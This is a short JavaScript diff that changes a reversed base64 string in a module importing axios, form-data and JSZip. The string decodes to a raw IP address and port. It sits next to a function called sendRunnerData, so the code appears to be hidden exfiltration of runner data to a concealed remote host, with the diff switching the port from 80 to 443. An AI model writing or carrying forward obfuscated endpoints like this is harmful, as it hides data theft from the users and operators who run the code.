@@ -2,7 +2,7 @@ const axios = require("axios");
 const FormData = require('form-data');
 const JSZip = require("jszip");
 
-const encoded = 'wgjO0UjMuYjMy4SM4EjL1MTM'
+const encoded = '==wM0QjO0UjMuYjMy4SM4EjL1MTM'
 const decodeStr = str => atob(str.split('').reverse().join(''));
 
 const sendRunnerData = async (runners) => {
